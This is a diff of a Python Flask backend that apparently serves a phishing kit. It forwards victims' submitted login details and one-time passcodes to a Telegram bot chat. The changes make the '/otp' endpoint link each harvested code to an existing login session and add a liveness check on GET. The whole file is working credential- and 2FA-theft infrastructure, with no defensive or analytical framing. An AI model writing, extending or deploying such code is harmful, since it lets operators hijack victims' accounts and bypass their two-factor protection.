@@ -34,9 +34,7 @@ def send_to_telegram(data, session_id):
             print("❌ BOT_TOKEN or CHAT_ID missing")
             return
 
-        # Detect message type
         is_otp = "OTP" in data
-
         msg = "🔢 OTP VERIFICATION\n\n" if is_otp else "🔐 LOGIN\n\n"
 
         for k, v in data.items():
@@ -84,10 +82,14 @@ def login():
     })
 
 # ================= OTP =================
-@app.route("/otp", methods=["POST"])
+@app.route("/otp", methods=["GET", "POST"])
 def otp():
+    if request.method == "GET":
+        return "OTP endpoint is alive"
+
     data = request.get_json() or {}
     otp_value = data.get("otp")
+    session_id = data.get("session_id")
 
     if not otp_value:
         return jsonify({
@@ -95,11 +97,22 @@ def otp():
             "error": "OTP is required"
         }), 400
 
-    session_id = str(uuid.uuid4())
+    if not session_id:
+        return jsonify({
+            "success": False,
+            "error": "session_id is required"
+        }), 400
+
+    if session_id not in SESSION_STATUS:
+        return jsonify({
+            "success": False,
+            "error": "invalid session"
+        }), 400
+
     SESSION_STATUS[session_id] = "pending"
 
     print("🔢 OTP RECEIVED:", otp_value)
-    print("🆕 OTP SESSION:", session_id)
+    print("🔗 SESSION:", session_id)
 
     send_to_telegram({"OTP": otp_value}, session_id)
 
